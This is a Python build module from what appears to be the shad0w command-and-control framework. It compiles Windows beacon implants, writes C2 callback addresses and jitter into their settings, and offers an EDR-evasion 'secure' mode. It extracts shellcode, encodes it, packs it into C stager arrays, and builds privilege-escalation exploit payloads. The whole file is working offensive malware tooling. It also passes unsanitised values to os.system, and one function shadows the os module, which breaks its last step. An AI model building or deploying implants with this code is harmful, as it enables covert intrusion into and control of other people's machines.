import os
import base64

from lib import shellcode

# warnings to the user about the module they are using
secure_warning = """The secure payload makes heavy use of new windows features and ntdll api hooking.
This can make the payload a lot more resistant to EDR products but can also make it more unstable.
Its been tested on:
    -   x64 Windows 8.1, x64 Windows 10 (Pro & Enterprise)
    -   x64 Windows Server 2019
It may work on other systems as well.
"""
static_warning = """Static payloads can be very large and much easier to detect.
For use in droppers, loaders, exploits etc staged payloads are recommended as they are much smaller, so easier to use.
"""

def clone_source_files(rootdir="src", builddir="build", asm=False, backmake=False):
    # move the source files of the beacon over
    # to the build directory

    # put us in the correct dir (this obviously needs to be inside docker)
    os.chdir("/root/shad0w/beacon")

    # clean the build dir
    os.system(f"rm {builddir}/*")

    # why reinvent the wheel? lets jus use cp
    os.system(f"cp {rootdir}/*.c {builddir}/")
    os.system(f"cp {rootdir}/*.h {builddir}/")
    if asm: os.system(f"cp {rootdir}/*.asm {builddir}/")
    if not backmake: os.system(f"cp {rootdir}/Makefile {builddir}/")
    if backmake: os.system(f"cp {rootdir}/../Makefile {builddir}/")

    return

def update_settings_file(shad0wbuild, custom_template=None, custom_path=None):
    # update the settings so that when we build
    # we will use our new args

    # this is hardcoded so will need docker
    if custom_path == None:
        settings_path = "/root/shad0w/beacon/build/settings.h"
    elif custom_path != None:
        settings_path = custom_path

    # make our settings.h file
    if custom_template == None:
        settings_template = """#define _C2_CALLBACK_ADDRESS L"%s"
    #define _C2_CALLBACK_PORT %s
    #define _CALLBACK_USER_AGENT L"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36"

    #define _CALLBACK_JITTER %s000""" % (shad0wbuild.address, shad0wbuild.port, shad0wbuild.jitter)

    # use a custom build template
    elif custom_template is not None:
        settings_template = custom_template

    # and just write it
    with open(settings_path, 'w') as file:
        file.write(settings_template)
    
    return

def make_in_clone(arch=None, platform=None, secure=None, static=None, builddir=None, modlocation="/root/shad0w/beacon/beacon.exe", debug=False, make_target=None):
    # build the beacon from the source files, making sure to
    # obey the correct payload settings that we have been given

    # builddir should only be none when we are building a beacon
    if builddir is None:
        builddir = "/root/shad0w/beacon/build"
    
    # build the compile time args
    compile_args = ""

    if secure is not None:
        compile_args += "-DSECURE"

    # remove the old file
    try:
        os.unlink(modlocation)
    except: pass

    # make sure we in the correct build dir
    os.chdir(builddir)

    # write the compile args to the makefile
    with open("Makefile", "r") as file:
        new_data = ""
        data     = file.read()

        for line in data.splitlines():
            if line.startswith("VARIABLES"):
                line = "VARIABLES=" + compile_args
            new_data += line + "\n"

        wfile = open("Makefile", "w")
        wfile.write(new_data)
        wfile.close()

    # and lets make
    if make_target is None:
        make_target = arch

    if not debug:
        os.system(f"make {make_target} 1>/dev/null 2>&1")
        # os.system(f"make {make_target}")
    elif debug:
        os.system(f"make {make_target}_debug")

    # check that our beacon was actually made
    try:
        open(modlocation, 'rb')
    except FileNotFoundError:
        print("ERROR: building module")
        return False
    
    return True

def extract_shellcode(beacon_file="/root/shad0w/beacon/beacon.exe", want_base64=False):
    # use donut to extract the shellcode from
    # our newly created beacon

    # use donut to get it
    if want_base64 is False:
        code = shellcode.generate(beacon_file, None, None, parse=False)
    
    elif want_base64 is True:
        code = base64.b64encode(shellcode.generate(beacon_file, None, None, parse=False)).decode()

    return code

def write_and_bridge(filename, rcode):
    # write the supplied code to the file given
    # by the user and then make sure they can access it

    # might change this?
    os.chdir("/root/shad0w/.bridge")

    # remove the old beacon file
    os.unlink("/root/shad0w/beacon/beacon.exe")

    with open(filename, 'wb') as file:
        file.write(rcode)
    
    # print(f"wrote {len(rcode)} bytes to {filename}")
    print("\033[1;32m[+]\033[0m", f"Created {filename} ({len(rcode)} bytes)")

def raise_issue_payload(string):

        # throw an error with the payload string
        print(f"Invalid payload: '{string}'")

        # exit with error code
        exit(-1)

def get_payload_variables(payload_string, warn=True):

        global secure_warning, static_warning
        
        # set our return args
        arch     = None
        platform = None
        secure   = None
        static   = None

        # split up the payload string
        payload = payload_string.split('/')

        # these two are essential so die without them
        try:
            arch     = payload[0]
            platform = payload[1]
        except IndexError:
            raise_issue_payload(payload_string)

        # these two dont matter as much
        try:
            secure   = payload[2]
            static   = payload[3]
        except IndexError:
            pass
    
        # make sure we get the correct args
        try:
            if static == "static":
                static = static
            if secure == "static":
                static = secure
                secure = None
            if secure not in ["secure", None]:
                raise_issue_payload(payload_string)
        except NameError: pass

        # give the user the warnings
        if warn:
            if secure is not None: print(f"\033[1;33m{secure_warning}\033[0m")
            if static is not None: print(f"\033[1;33m{static_warning}\033[0m")

        # check we have correct arg names
        try:
            assert arch in ["x86", "x64"]
            assert platform in ["windows", "linux", "osx"]
        except AssertionError:
            raise_issue_payload(payload_string)

        # return our generated args
        return arch, platform, secure, static

def elevate_auto_build(rootdir=None, template=None, arch=None, check=False, exploit=False):
    # make the build process quicker for modules

    # clone all the source files
    build_dir = rootdir + "/../build"
    clone_source_files(rootdir=rootdir, builddir=build_dir, backmake=True)

    # set the settings file if we have any
    if template is not None:
        settings_file = build_dir + "/settings.h"
        update_settings_file(None, custom_template=template, custom_path=settings_file)
    
    # compile it
    if arch is None:
        arch = "x86"
    if check:
        location = rootdir + "../../check.exe"
    if exploit:
        location = rootdir + "../../exploit.exe"

    if check:
        target = f"check_{arch}"
    elif exploit:
        target = f"exploit_{arch}"

    make_in_clone(builddir=build_dir, modlocation=location, arch=arch, make_target=target)
    
    # get the shellcode
    rcode = extract_shellcode(beacon_file=location, want_base64=True)

    # give the shellcode back
    return rcode

def shellcode_to_array(data):
    length = 0
    line_len = 0
    array = ""

    array += "unsigned char stage[] = {\n"

    for i in data:

        # keep the lines only 20 long
        if line_len == 20:
            array += f"{hex(i)}, \n"
            length += 1
            line_len = 0
            continue
        
        if line_len == 0:
            array += f"{hex(i)}, "
            length += 1
            line_len += 1
            continue
        
        # keep the correct sytax at the start
        if length == 0:
            array += f"{hex(i)}, "
            length += 1
            line_len += 1
            continue

        # keep the correct synatx though out
        elif length != 0:
            array += f"{hex(i)}, "
            length += 1
            line_len += 1
            continue
    
    array += "\n};\n"
    array += f"int stage_len = {len(data)};\n"

    return array
    

def elevate_build_stage(shad0w, rootdir=None, os=None, arch=None, secure=None, format=None):
    # if (rootdir or os or arch or secure) == None:
    #     return
    
    clone_source_files(asm=True, rootdir="stager")

    settings_template = """#define _C2_CALLBACK_ADDRESS L"%s"
#define _C2_CALLBACK_PORT %s
#define _CALLBACK_USER_AGENT L"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36"
#define _CALLBACK_JITTER %s000
""" % (shad0w.endpoint, shad0w.addr[1], 1)

    update_settings_file(None, custom_template=settings_template)

    # now we need to run 'make' inside the cloned dir
    shad0w.debug.spinner(f"Preparing exploit...")
    make_in_clone(arch=arch, platform=os, secure=secure, static=True)
    shad0w.debug.stop_spinner = True

    # get the shellcode from the payload
    if format == "raw":
        rcode = extract_shellcode()
    elif format == "exe":
        with open("/root/shad0w/beacon/beacon.exe", "rb") as file:
            rcode = file.read()

    # convert the shellcode to C array
    stage_template = shellcode_to_array(rcode)

    # write the stage to the header file
    stagefile = rootdir + "/stage.h"

    try:
        os.unlink(stagefile)
    except: pass

    with open(stagefile, "w+") as file:
        file.write(stage_template)